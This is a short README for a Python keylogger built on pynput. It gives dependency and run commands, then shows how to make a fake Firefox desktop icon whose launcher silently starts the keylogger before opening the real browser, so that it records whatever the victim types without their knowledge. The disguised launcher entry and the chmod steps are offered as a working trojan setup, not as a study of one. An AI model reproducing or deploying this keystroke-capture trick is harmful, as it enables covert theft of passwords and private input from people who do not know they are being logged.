# Keylogger
### Dependencies:
To run the keylogger on a linux system, first ensure that pynput is installed on the system. If it is not, then install it using pip:
```
pip install pynput
```

That should be the only dependency. 

---
### Run the Script:
To run the script use this command:
```
python3 keylogger.py &
```
To stop the script from executing, simply press the ESC key. The log will be contained in the same folder as the keylogger.py by the name "log_keys.log".

---
### Fake a Desktop Icon in Linux:
To create a fake icon in linux first begin by putting the script in your home folder for ambiguitys. Then create a file like this:
```
nano ~/Desktop/firefox.desktop
```
Now paste the below code into the file:
```
[Desktop Entry]
Name=Firefox
Exec=sh -c "python3 ~/keylogger.py & firefox; kill $!"
Type=Application
Icon=firefox
```
This will create an icon on your desktop that will run the keylogger script from the home directory and then open firefox as if nothing hppened. You may need to change some permissions. Run these:
```
chmod +x ~/keylogger.py ~/Desktop/firefox.desktop
```
Lastly, you'll need to right click the icon and click "Allow Launching" or whatever terminology allows the script. There did not appear to be a way to do this last part without actually right clicking with a mouse, and would seem to be a security feature that prevents an attacker from doing this with commands only.

Now you should see the icon in full color. Double click the icon, and begin typing in the browser. This setup will record all activity from inside the browser only. When you are done, you can press ESC key to end the keylogging, or simply exit firefox. Read the file located in the same directory as keylogger.py titled "log_keys.log". NOTE: the log file is deleted every time the program stats up.

---
#### References:
I used this site as a guide on how to use pynput:
https://medium.com/analytics-vidhya/python-keylogger-tutorial-ef178d02f24a